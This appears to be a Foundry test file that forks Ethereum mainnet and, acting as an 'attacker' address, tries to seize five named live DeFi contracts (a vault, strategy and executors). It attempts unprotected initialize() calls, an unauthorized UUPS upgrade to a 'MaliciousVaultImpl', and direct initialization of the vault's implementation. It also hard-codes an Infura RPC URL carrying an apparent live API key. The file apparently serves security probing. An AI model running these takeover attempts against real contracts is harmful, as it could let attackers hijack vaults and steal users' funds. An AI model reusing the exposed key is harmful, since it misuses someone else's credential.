// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IUUPSUpgradeable {
    function upgradeTo(address) external;
    function upgradeToAndCall(address, bytes calldata) external payable;
    function proxiableUUID() external view returns (bytes32);
}

contract InitializeExploitTest is Test {
    address constant STRATEGY = 0x60d2D94aCB969CA54e781007eE89F04c1A2e5943;
    address constant STRATEGY_STORAGE = 0x97c03F52244E60BB18511Cbf03f890D5886f1F47;
    address constant STRATEGY_EXECUTOR = 0x89f57D3617F6a9FF877fEa34Dd0688b2840Ef50e;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant ACTION_EXECUTOR = 0xb1593193Bcd7CEcc3d19597658003d735D1e9E94;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    
    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_TryInitializeContracts() public {
        console.log("=== TRYING TO INITIALIZE CONTRACTS ===\n");
        
        address[5] memory contracts = [STRATEGY, STRATEGY_STORAGE, STRATEGY_EXECUTOR, VAULT, ACTION_EXECUTOR];
        
        vm.startPrank(attacker);
        
        for (uint i = 0; i < contracts.length; i++) {
            console.log("Contract:", contracts[i]);
            
            (bool success,) = contracts[i].call(abi.encodeWithSignature("initialize(address)", attacker));
            if (success) console.log("initialize(address) succeeded!");
            
            (success,) = contracts[i].call(abi.encodeWithSignature("initialize()"));
            if (success) console.log("initialize() succeeded!");
            
            (success,) = contracts[i].call(abi.encodeWithSignature("initialize(address,address)", attacker, attacker));
            if (success) console.log("initialize(address,address) succeeded!");
        }
        
        vm.stopPrank();
    }

    function test_TryUpgradeVault() public {
        console.log("=== TRYING TO UPGRADE VAULT ===\n");
        
        bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        bytes32 adminSlot = bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1);
        
        bytes32 impl = vm.load(VAULT, implSlot);
        bytes32 admin = vm.load(VAULT, adminSlot);
        
        console.log("Vault implementation slot:");
        console.logBytes32(impl);
        console.log("Vault admin slot:");
        console.logBytes32(admin);
        
        if (impl != bytes32(0)) {
            address implAddr = address(uint160(uint256(impl)));
            console.log("Implementation address:", implAddr);
        }
        
        vm.startPrank(attacker);
        
        address maliciousImpl = address(new MaliciousVaultImpl());
        
        try IUUPSUpgradeable(VAULT).upgradeTo(maliciousImpl) {
            console.log("CRITICAL: upgradeTo succeeded!");
        } catch {
            console.log("upgradeTo failed (expected)");
        }
        
        vm.stopPrank();
    }

    function test_DirectCallToImplementation() public {
        console.log("=== TRYING DIRECT CALL TO VAULT IMPLEMENTATION ===\n");
        
        bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        bytes32 impl = vm.load(VAULT, implSlot);
        
        if (impl != bytes32(0)) {
            address implAddr = address(uint160(uint256(impl)));
            console.log("Vault implementation:", implAddr);
            
            // Check implementation's init state
            bytes32 initSlot = vm.load(implAddr, bytes32(0));
            console.log("Implementation slot 0:");
            console.logBytes32(initSlot);
            
            vm.startPrank(attacker);
            
            (bool success,) = implAddr.call(abi.encodeWithSignature("initialize(address)", attacker));
            console.log("Initialize implementation:", success);
            
            vm.stopPrank();
        } else {
            console.log("Vault is not a proxy");
        }
    }
}

contract MaliciousVaultImpl {
    function proxiableUUID() external pure returns (bytes32) {
        return bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
    }
}
